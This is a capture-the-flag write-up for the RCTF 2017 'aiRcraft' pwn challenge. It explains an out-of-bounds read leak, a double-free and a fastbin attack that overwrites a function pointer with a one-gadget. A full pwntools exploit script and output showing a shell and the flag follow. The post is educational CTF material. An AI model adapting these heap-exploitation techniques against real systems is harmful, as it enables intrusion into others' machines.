---
layout: post
title: RCTF 2017 - aiRcraft
published: True
---

**Points:** 606
**Solves:** 14
**Category:** Exploitation 

> [aiRcraft](../binaries/aiRcraft)

> [libc.so.6](../binaries/libc.so.6)

{% highlight bash %}
aiRcraft: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f8597b2bb97a5f0ffd55603a10b55629eabebfa6, stripped
{% endhighlight %}

{% highlight bash%}
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
{% endhighlight %}

## Vulnerability
This program allows us to build planes, which we can name, as well as build airports, which we can also name.
We can fly planes to different airports and also delete different planes and airports.

There are many different vulnerabilities in this program.

Firstly, there is a **out-of-bounds read vulnerability** which allows us to leak a libc and heap pointer.

In the following diassembly, `choice_` is an index that we get to specify that has **no checks performed on it.**  
{% highlight bash %}
.text:0000555555554C91                 mov     eax, [rbp+choice_]
.text:0000555555554C94                 sub     eax, 1
.text:0000555555554C97                 cdqe
.text:0000555555554C99                 lea     rdx, ds:0[rax*8]
.text:0000555555554CA1                 lea     rax, companies
.text:0000555555554CA8                 mov     rdx, [rdx+rax]
.text:0000555555554CAC                 mov     rax, [rbp+chunk]
.text:0000555555554CB0                 mov     [rax+plane.companyPtr], rdx
.text:0000555555554CB4                 lea     rdi, aInputThePlaneS ; "Input the plane's name: "
{% endhighlight %} 

`companies` is a global array that contains 4 pointers, each pointing to a different string.
Eventually, we can print out the contents of whatever pointer is associated with the `choice_` index into this array that we specify.
But as we can see, there is nothing preventing us from specifying an index greater than 4.

We can simply free a couple airports to get a libc pointer and heap pointer into some heap chunks, and then specify `14` and `15` as our indices for 2 planes that we fly to an airport.

Then we just list the information for all the planes in that airport to get our leaks

{% highlight bash %}
gdb-peda$ x/32xg 0x555555756020
0x555555756020: 0x00005555555555d8      0x00005555555555df <-- start of companies array
0x555555756030: 0x00005555555555e6      0x00005555555555ef
0x555555756040 <stdout>:        0x00007ffff7dd2620      0x0000000000000000
0x555555756050 <stdin>: 0x00007ffff7dd18e0      0x0000000000000000
0x555555756060 <stderr>:        0x00007ffff7dd2540      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
0x555555756080: 0x0000555555757010      0x0000555555757130 <-- start of airports array
0x555555756090: 0x0000555555757250      0x0000000000000000
0x5555557560a0: 0x0000000000000000      0x0000000000000000
0x5555557560b0: 0x0000000000000000      0x0000000000000000
0x5555557560c0: 0x0000000000000000      0x0000000000000000
0x5555557560d0: 0x0000000000000000      0x0000000000000000
0x5555557560e0: 0x0000000000000000      0x0000000000000000
0x5555557560f0: 0x0000000000000000      0x0000000000000000
0x555555756100: 0x0000000000000000      0x0000000000000000
0x555555756110: 0x0000000000000000      0x0000000000000000
gdb-peda$ x/xg 0x0000555555757130
0x555555757130: 0x00007ffff7dd1bf8  <-- libc addr
gdb-peda$ x/xg 0x0000555555757250
0x555555757250: 0x00005555557572e0  <-- heap addr
{% endhighlight %}

Additionally, there is a **double-free vulnerability** as well as a **use-after-free (UAF) vulnerability.**

We can use these vulnerabilities to perform a fast-bin attack. 
However, instead of overwriting a `*_hook` functions, as I've done in the past, we will instead, overwrite a `specialFree` function pointer that is just a wrapper around `free()` that is called whenever a plane is directly sold. 

The struct for a plane object looks something like the following.

{% highlight C %}
struct plane {
    char name[32];
    char *company;
    airport *aport;
    plane *prevPlane;
    plane *nextPlane;
    void (*specialFree)(plane);    
}
{% endhighlight %}
We can see the function pointer we want to overwrite at offset `+0x40` into the `plane` object.

Our target plane fast chunk looks like the following. 
{% highlight bash %}
gdb-peda$ x/32xg 0x562c639bd120
0x562c639bd120: 0x0000000000000000      0x0000000000000051
0x562c639bd130: 0x0000562c639b0047      0x00007fcf455bbb00 
0x562c639bd140: 0x0000000000000000      0x0000000000000000
0x562c639bd150: 0x0000562c621be5ef      0x0000000000000000
0x562c639bd160: 0x0000562c639bd010      0x0000000000000000
0x562c639bd170: 0x0000562c621bdb7d      0x0000000000000041 <-- target fnc ptr
{% endhighlight %}

We can again use a misaligned address as our target fake chunk for our fastbin attack, since `malloc()` does not check to see that the requested chunk is aligned. 

**Only `realloc()` and `free()` perform alignment checks!**
{% highlight bash %}
gdb-peda$ x/32xg 0x562c639bd170-0x30+0xd
0x562c639bd14d: 0x2c621be5ef000000      0x0000000000000056
0x562c639bd15d: 0x2c639bd010000000      0x0000000000000056
0x562c639bd16d: 0x2c621bdb7d000000      0x0000000041000056
0x562c639bd17d: 0xcf455bbb78000000      0x2c639bd24000007f
{% endhighlight %}

One catch is that in order for us to be able to use this fake chunk to satisfy a `malloc()` request, the size field has to be `0x56` and not `0x55`. 

This is due to an extra check that is performed if the `IS_MMAPED` bit is turned off.

What we don't want to do, is end up here:
{% highlight bash %}
   0x7ffff7a91613 <__GI___libc_malloc+147>: mov    rax,QWORD PTR [rdx-0x8]
   0x7ffff7a91617 <__GI___libc_malloc+151>: test   al,0x2 <--- checks `IS_MMAPED` bit
   0x7ffff7a91619 <__GI___libc_malloc+153>: jne    0x7ffff7a9163c <__GI___libc_malloc+188> 
   0x7ffff7a9161b <__GI___libc_malloc+155>: test   al,0x4
   0x7ffff7a9161d <__GI___libc_malloc+157>: lea    rcx,[rip+0x3404fc]  # 0x7ffff7dd1b20 <main_arena>
   0x7ffff7a91624 <__GI___libc_malloc+164>: je     0x7ffff7a91633 <__GI___libc_malloc+179>
   0x7ffff7a91626 <__GI___libc_malloc+166>: lea    rax,[rdx-0x10]
   0x7ffff7a9162a <__GI___libc_malloc+170>: and    rax,0xfffffffffc000000
=> 0x7ffff7a91630 <__GI___libc_malloc+176>: mov    rcx,QWORD PTR [rax] <--- crashes!
   0x7ffff7a91633 <__GI___libc_malloc+179>: cmp    rcx,rbx
   0x7ffff7a91636 <__GI___libc_malloc+182>: jne    0x7ffff7a916ff <__GI___libc_malloc+383>
   0x7ffff7a9163c <__GI___libc_malloc+188>: mov    rax,rdx
   0x7ffff7a9163f <__GI___libc_malloc+191>: add    rsp,0x8
{% endhighlight %}

If our fake size is `0x55`, this causes a crash.
A SIGGEV access violation occurs @ the `mov    rcx,QWORD PTR [rax]` instruction on line `0x7ffff7a91630` because `0x55 AND 0x2 = 0x0` whereas `0x56 AND 0x2 = 0x2`.

The former causes the conditional jmp @ `0x7ffff7a91619` to not be taken, eventually leading us to `0x7ffff7a91630`.

So, long story short, **our exploit only works when the heap base address starts with `0x56` and not `0x55`.**    

After overwriting the `specialFree` function pointer, with a **magic one-gadget RCE** address, we simply sell the plane with the corrupted function pointer to get a shell.

Putting everything together, we can get the flag using the following exploit.

## Exploit
{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def addAirport(length, name):
    r.sendlineafter("choice: ","2")
    r.sendlineafter("name?", str(length))
    r.sendlineafter("name:", name)

def addPlane(company, name):
    r.sendlineafter("choice: ","1")
    r.sendlineafter("choice: ", str(company))
    r.sendlineafter("name: ", name)

def sellAirport(idx):
    r.sendlineafter("choice: ","3")
    r.sendlineafter("choose?",str(idx)) 
    r.sendlineafter("choice: ","2")

def flyPlane(plane, airport):
    r.sendlineafter("choice: ","4")
    r.sendlineafter("choose?",plane)
    r.sendlineafter("choice: ","1")
    r.sendlineafter("fly? ",str(airport))
    r.sendlineafter("choice: ", "3") # exit

def listPlanes(airport):
    r.sendlineafter("choice: ","3")
    r.sendlineafter("choose? ",str(airport))
    r.sendlineafter("choice: ", "1") # list
    leak = r.recvuntil("Exit")
    r.sendlineafter("choice: ", "3") # exit
    return leak

def sellPlane(plane):
    r.sendlineafter("choice: ","4")
    r.sendlineafter("choose?", plane)
    r.sendlineafter("choice: ","2") # sell

def exploit(r):
    libc = ELF("./libc.so.6")
   
    ## LEAK LIBC ##
    addAirport(0x80,"A")
    addAirport(0x80,"B")
    addAirport(0x80,"C")
    sellAirport(0)
    sellAirport(1)
    addPlane(14,"D")
    flyPlane("D",2)
    libc_base = u64(listPlanes(2).split("by ")[1][0:6].ljust(8,'\0'))-0x3c3bf8
    one_gadget = libc_base+0xf0567
    log.success("libc base found at: "+hex(libc_base))
    log.success("one_gadget found at: "+hex(one_gadget))

    ## LEAK HEAP ##
    addPlane(15,"E")
    flyPlane("E",2)
    heap_base = u64(listPlanes(2).split("by ")[2][0:6].ljust(8,'\0'))-0x2e0
    heap_target = heap_base+0x170 # fnc ptr for plane G
    if heap_target < 0x560000000000 or heap_base < 0x560000000000:
        log.failure("heap addr needs to start with 0x56! try again.")
        sys.exit(1)
    log.success("heap base found at: "+hex(heap_base)) 
    log.success("target func ptr found at: "+hex(heap_target)) 
    
    ## FASTBIN ATTACK ##
    log.info("starting fastbin attack...")
    sellPlane("D")
    sellPlane("E")
    sellAirport(2)
    addPlane(4, p64(heap_target-0x30+0xd))
    addPlane(4, "F")
    addPlane(4, "G")
    # pause()
 
    payload = "A"*3
    payload += p64(heap_base+0x10) # keep original prev plane ptr to avoid crash
    payload += p64(0x0)
    payload += p64(one_gadget) # overwrite free fnc ptr
    addAirport(0x48, payload)
    
    ## TRIGGER FNC POINTER ##
    log.info("triggering corrupted func ptr...")
    sellPlane("G")

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/rctf17/aircraft/aiRcraft'], env={"LD_PRELOAD":"./libc.so.6"})
        #r = process(['/home/vagrant/CTFs/rctf17/aircraft/aiRcraft'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
{%endhighlight %}
{% highlight text %}
➜  aircraft python solve.py aircraft.2017.teamrois.cn 9731
[*] For remote: solve.py HOST PORT
[+] Opening connection to aircraft.2017.teamrois.cn on port 9731: Done
[*] '/home/vagrant/CTFs/rctf17/aircraft/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] libc base found at: 0x7f25c6703000
[+] one_gadget found at: 0x7f25c67f3567
[+] heap base found at: 0x56143527c000
[+] target func ptr found at: 0x56143527c170
[*] starting fastbin attack...
[*] triggering corrupted func ptr...
[*] Switching to interactive mode
$ ls
aiRcraft
bin
dev
flag
lib
lib32
lib64
$ cat flag
RCTF{H4v3_4_g00d_tr1p_w1th_lul}
$  
{% endhighlight %}
